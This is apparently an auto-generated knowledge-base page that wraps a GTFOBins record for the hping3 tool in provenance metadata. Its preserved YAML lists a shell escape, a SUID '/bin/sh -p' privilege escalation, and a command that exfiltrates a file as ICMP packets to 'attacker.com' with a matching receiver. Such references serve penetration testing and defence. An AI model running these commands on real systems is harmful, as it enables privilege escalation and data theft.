---
parsed_by: focuslocust
source: gtfobins
type: generated
---
# hping3

[Home](../../../README.md)

## Provenance

| Field | Value |
| --- | --- |
| Source | `gtfobins` |
| Type | `tool` |
| Record ID | `hping3` |
| Source file | `/home/adams/scorchederf/focuslocust/.cache/gtfobins/_gtfobins/hping3` |
| Parsed by | `focuslocust` |
| Relationship mode | `explicit / conservative inferred / manual` |

## Generated Concept Page

- [hping3](../../tools/linux/hping3.md)

## Extracted Fields

| Field | Value |
| --- | --- |
| id | hping3 |
| name | hping3 |
| type | tool |
| source | gtfobins |
| url | https://gtfobins.github.io/gtfobins/hping3/ |

## Preserved Source Material

```yaml
_body: ''
_name: hping3
_source_path: /home/adams/scorchederf/focuslocust/.cache/gtfobins/_gtfobins/hping3
functions:
  shell:
  - code: 'hping3

      /bin/sh'
    contexts:
      sudo: null
      suid:
        code: 'hping3

          /bin/sh -p'
        shell: false
      unprivileged: null
  upload:
  - code: hping3 attacker.com --icmp --data 999 --sign xxx --file /path/to/input-file
    comment: The file is continuously sent as ICMP packets (e.g., of `999` bytes), the optional `--end` parameter signals
      when the file reached the end.
    contexts:
      sudo: null
    receiver:
      code: hping3 --icmp --listen xxx --dump
      comment: The same program can be used on the attacker box to receive the data.
```
